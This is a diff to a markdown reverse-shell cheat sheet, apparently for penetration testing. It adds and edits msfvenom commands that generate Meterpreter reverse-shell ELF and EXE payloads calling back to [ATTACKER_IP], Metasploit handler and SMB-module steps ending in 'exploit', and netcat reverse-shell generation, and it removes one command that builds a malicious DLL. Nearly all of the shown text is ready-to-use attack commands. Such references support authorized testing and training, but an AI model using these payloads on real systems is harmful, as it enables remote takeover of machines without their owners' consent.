@@ -42,7 +42,8 @@ Reverse shells are a good way to bypass firewalls. The drawback is that we need 
  > 
  > **<font color=red>use</font> <font color=lightblue>exploit/multi/handler</font>**</br>
  > 
- > **<font color=red>set payload</font> linux/x86/meterpreter/reverse_tcp**</br>
+ > \*\*<font color=red>set payload linux/x86/meterpreter/reverse_tcp</font> \*\*</br>
+ > **<font color=red>exploit</font>**</br>
  > Handler for linux (efl) reverse shell.
 
 # Reverse Shell Multi
@@ -121,11 +122,6 @@ Location on Kali: <font color=lightblue>/usr/share/webshells/php/php-reverse-she
  > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f exe -o </font>shell<font color=red>.exe</font>**</br>
  > Generate a meterpreter reverse shell exe.
 
-
- > 
- > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f dll -o</font> msfvenom_revshell<font color=red>.dll</font>**</br>
- > Generate a malicious DLL (meterpreter reverse shell).
-
 ---
 
 ### METASPLOIT (SMB)
@@ -140,6 +136,7 @@ Location on Kali: <font color=lightblue>/usr/share/webshells/php/php-reverse-she
  > **<font color=red>set smbuser </font>\[TARGET_USER\]**</br>
  > **<font color=red>set smbpass</font> \[TARGET_IP\]**</br>
  > **<font color=red>set payload </font>windows/x64/meterpreter/reverse_tcp**</br>
+ > **<font color=red>exploit</font>**</br>
  > Create a reverse shell from a SMB share.
 
 # Reverse Shell Linux
@@ -159,8 +156,15 @@ Location on Kali: <font color=lightblue>/usr/share/webshells/php/php-reverse-she
 
 
  > 
- > **<font color=red>msfvenom -p cmd/unix/reverse_netcat LHOST=</font>\[ATTACKER_OP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\]**</br>
+ > **<font color=red>msfvenom -p cmd/unix/reverse_netcat LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\]**</br>
  > Generate a Linux reverse shell.
+
+ > 
+ > **<font color=red>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f elf ></font> reverse.elf**</br>
+ > Generate a Meterpreter Reverse Shell for Linux x86.
+ > 
+ > **<font color=red>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f elf ></font> reverse.elf**</br>
+ > Generate a Meterpreter Reverse Shell for Linux x64.
 
 # Web Shell
 
